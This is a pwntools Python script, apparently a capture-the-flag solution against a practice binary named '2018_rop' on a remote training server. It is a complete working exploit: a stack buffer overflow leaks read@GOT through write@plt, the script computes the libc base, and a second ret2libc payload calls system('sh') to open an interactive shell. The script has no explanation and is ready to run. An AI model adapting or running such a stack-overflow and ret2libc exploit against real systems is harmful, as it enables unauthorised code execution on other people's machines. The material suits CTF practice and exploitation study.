from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6-i386_2.27-3ubuntu1_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 26583

elf = ELF("./2018_rop")

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *0x8048496
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def attack():
    payload = b"A" * 0x8c
    payload += p32(elf.plt["write"])
    payload += p32(elf.sym["_start"])
    payload += p32(1)
    payload += p32(elf.got["read"])
    payload += p32(4)
    sock.send(payload)
    addr_read_got = u32(sock.recv(4))
    log.success("addr_read_got = " + hex(addr_read_got))
    addr_libc_base = addr_read_got - libc.sym["read"]
    log.success("addr_libc_base = " + hex(addr_libc_base))

    addr_system = addr_libc_base + libc.sym["system"]
    addr_sh_str = addr_libc_base + next(libc.search(b"sh\x00"))

    sleep(0.5)
    payload = b"A" * 0x8c
    payload += p32(addr_system)
    payload += p32(0)
    payload += p32(addr_sh_str)
    sock.send(payload)

if __name__ == "__main__":
    attack()
    sock.interactive()



